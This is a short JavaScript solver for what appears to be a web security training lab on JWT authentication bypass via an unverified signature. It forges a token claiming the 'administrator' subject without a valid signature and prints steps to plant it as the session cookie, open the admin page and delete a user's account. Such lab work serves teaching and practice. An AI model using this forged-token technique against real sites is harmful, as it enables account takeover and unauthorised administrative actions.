import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via unverified signature",
});

runTasks([task]);

function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${createAdminJwtWithoutSignature()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

function createAdminJwtWithoutSignature() {
  const header = { alg: "HS256" };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload });
}
